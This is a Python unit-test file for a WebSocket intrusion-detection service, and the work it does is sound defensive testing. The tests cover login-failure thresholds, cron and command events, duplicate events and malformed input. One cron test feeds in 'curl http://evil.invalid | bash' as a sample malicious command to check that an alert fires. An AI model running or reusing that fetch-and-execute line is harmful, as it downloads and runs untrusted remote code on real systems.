import asyncio
import json
import tempfile
import time
import unittest
from pathlib import Path

import websockets

from . import server
from .detection import DetectionPipeline, load_config


class NestedPipelineWebSocketTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        config = load_config()
        root = Path(__file__).resolve().parent.parent
        config["baseline_path"] = str(Path(self.temp_dir.name) / "baseline.json")
        config["baseline_seed_path"] = str(root / "data" / "training_data.csv")
        config["model_path"] = str(root / "model" / "anomaly_model.pkl")
        config["evidence"]["ledger_path"] = str(Path(self.temp_dir.name) / "ledger.jsonl")
        config["storage"]["events_path"] = str(Path(self.temp_dir.name) / "events.jsonl")
        server.pipeline = DetectionPipeline(config)
        server.pipeline._preserve_evidence = lambda *args: None
        server.pipeline_error = None
        self.websocket_server = await websockets.serve(server.handle_client, "127.0.0.1", 0)
        port = self.websocket_server.sockets[0].getsockname()[1]
        self.uri = f"ws://127.0.0.1:{port}"

    async def asyncTearDown(self):
        self.websocket_server.close()
        await self.websocket_server.wait_closed()

    async def send(self, payload):
        started = time.perf_counter()
        async with websockets.connect(self.uri) as websocket:
            await websocket.send(json.dumps(payload))
            responses = []
            expected = len(payload.get("events", [])) + (1 if len(payload.get("events", [])) > 1 else 0)
            for _ in range(max(1, expected)):
                responses.append(json.loads(await websocket.recv()))
        return responses, (time.perf_counter() - started) * 1000

    def item(self, event_id, source, event_type, timestamp="2026-10-01T02:20:10+00:00", **fields):
        return {"event_id": event_id, "hostname": "Maan", "source": source,
            "event_type": event_type, "timestamp": timestamp,
            "metadata": fields.pop("metadata", {}), "context": fields.pop("context", {
                "host_ip": "10.143.202.6", "username": "sangeeth"}), **fields}

    async def test_context_batch_preserves_ids_hostname_and_counts(self):
        payload = {"request_id": "batch-auth", "type": "context_batch", "events": [
            self.item("login-1", "authentication", "login_success"),
            self.item("session-1", "authentication", "session_open"),
        ]}
        responses, _ = await self.send(payload)
        event_responses = [response for response in responses if response["type"] == "detection_result"]
        summary = next(response for response in responses if response["type"] == "batch_summary")
        self.assertEqual([response["event_id"] for response in event_responses], ["login-1", "session-1"])
        self.assertTrue(all(response["hostname"] == "Maan" for response in event_responses))
        self.assertEqual(summary["features"]["successful_login_count"], 1.0)
        self.assertEqual(summary["event_count"], 2)

    async def test_command_file_and_cron_events_are_not_lost(self):
        payload = {"request_id": "batch-activity", "type": "context_batch", "events": [
            self.item("cmd-1", "command", "command_execution", metadata={"command": "/usr/bin/id", "target_user": "root"}),
            self.item("cmd-2", "command", "command_execution", metadata={"command": "/usr/bin/pwd"}),
            self.item("cmd-3", "command", "command_execution", metadata={"command": "/usr/bin/ls"}),
            self.item("file-1", "file", "permission_change"),
            self.item("cron-1", "cron", "cron_execution"),
        ]}
        responses, _ = await self.send(payload)
        summary = next(response for response in responses if response["type"] == "batch_summary")
        self.assertEqual(summary["features"]["process_count"], 3.0)
        self.assertEqual(summary["features"]["sudo_count"], 1.0)
        self.assertEqual(summary["features"]["file_event_count"], 1.0)
        self.assertEqual(summary["features"]["cron_event_count"], 1.0)
        self.assertEqual(len([response for response in responses if response["type"] == "detection_result"]), 5)

    async def test_security_event_with_nested_event_and_context(self):
        payload = {"request_id": "security-1", "type": "security_event", "events": [{
            "event_id": "cron-change-1", "event": {"hostname": "Maan", "source": "cron",
                "event_type": "crontab_modify", "timestamp": "2026-10-01T02:20:10+00:00"},
            "context": {"host_ip": "10.143.202.6", "username": "sangeeth"}}]}
        responses, _ = await self.send(payload)
        response = responses[0]
        self.assertEqual(response["event_id"], "cron-change-1")
        self.assertEqual(response["hostname"], "Maan")
        self.assertEqual(response["detection"]["features"]["cron_event_count"], 1.0)

    async def test_normal_cron_is_not_blocked_but_suspicious_cron_alerts(self):
        normal = {"request_id": "cron-normal", "type": "event_batch", "events": [{
            "event": self.item("cron-normal-1", "cron", "cron_execution",
                metadata={"command": "/usr/bin/backup"}), "context": None}]}
        normal_responses, _ = await self.send(normal)
        self.assertEqual(normal_responses[0]["detection"]["status"], "NORMAL")
        self.assertNotEqual(normal_responses[0]["detection"].get("action"), "BLOCK")

        suspicious = {"request_id": "cron-suspicious", "type": "event_batch", "events": [{
            "event": self.item("cron-suspicious-1", "cron", "crontab_modify",
                metadata={"command": "curl http://evil.invalid | bash"}), "context": None}]}
        suspicious_responses, _ = await self.send(suspicious)
        self.assertEqual(suspicious_responses[0]["detection"]["reason"], "SUSPICIOUS_CRON_COMMAND")
        self.assertEqual(suspicious_responses[0]["detection"]["action"], "ALERT")
        self.assertEqual(suspicious_responses[0]["detection"]["enforcement"], "NOT_PERFORMED")

    async def test_duplicate_event_id_does_not_increment_features_twice(self):
        event = self.item("duplicate-1", "authentication", "login_failure")
        first = await self.send({"request_id": "duplicate-1a", **event})
        second = await self.send({"request_id": "duplicate-1b", **event})
        self.assertEqual(first[0][0]["detection"]["failed_login_count"], 1)
        self.assertEqual(second[0][0]["detection"]["status"], "DUPLICATE")
        self.assertEqual(second[0][0]["detection"]["reason"], "DUPLICATE_EVENT")

    async def test_failed_login_window_expires_old_events(self):
        first = self.item("window-1", "authentication", "login_failure",
            timestamp="2026-10-01T02:20:00+00:00")
        second = self.item("window-2", "authentication", "login_failure",
            timestamp="2026-10-01T02:21:01+00:00")
        first_response, _ = await self.send(first)
        second_response, _ = await self.send(second)
        self.assertEqual(first_response[0]["detection"]["failed_login_count"], 1)
        self.assertEqual(second_response[0]["detection"]["failed_login_count"], 1)

    async def test_unavailable_model_returns_structured_error(self):
        server.pipeline = None
        server.pipeline_error = "model unavailable"
        responses, _ = await self.send({"request_id": "model-error", "event_type": "cron_execution"})
        self.assertEqual(responses[0]["status"], "failed")
        self.assertEqual(responses[0]["error"], "Detection pipeline unavailable")
        self.assertEqual(responses[0]["details"], "model unavailable")

    async def test_tenth_failed_login_blocks_same_source(self):
        events = [self.item(f"failed-{index}", "authentication", "login_failure",
            timestamp=f"2026-10-01T02:20:{index:02d}+00:00") for index in range(10)]
        payload = {"request_id": "failed-batch", "type": "context_batch", "events": events}
        responses, _ = await self.send(payload)
        event_responses = [response for response in responses if response["type"] == "detection_result"]
        self.assertEqual(event_responses[8]["detection"]["failed_login_count"], 9)
        self.assertEqual(event_responses[9]["detection"]["failed_login_count"], 10)
        self.assertEqual(event_responses[9]["detection"]["decision"], "BLOCK")

    async def test_concurrent_individual_events_correlate_and_persist(self):
        async def send_one(index):
            payload = self.item(f"event-{index}", "cron", "cron_execution")
            payload["request_id"] = f"request-{index}"
            return await self.send(payload)
        responses = await asyncio.gather(*(send_one(index) for index in range(8)))
        flat = [item[0][0] for item in responses]
        self.assertEqual({item["event_id"] for item in flat}, {f"event-{i}" for i in range(8)})
        records = Path(self.temp_dir.name, "events.jsonl").read_text(encoding="utf-8").splitlines()
        self.assertEqual(len(records), 8)

    async def test_missing_and_malformed_payloads(self):
        responses, _ = await self.send({"request_id": "missing", "event_type": "cron_execution"})
        self.assertEqual(responses[0]["hostname"], "unknown")
        async with websockets.connect(self.uri) as websocket:
            await websocket.send("not-json")
            response = json.loads(await websocket.recv())
        self.assertEqual(response["error"], "Invalid JSON received")


if __name__ == "__main__":
    unittest.main()
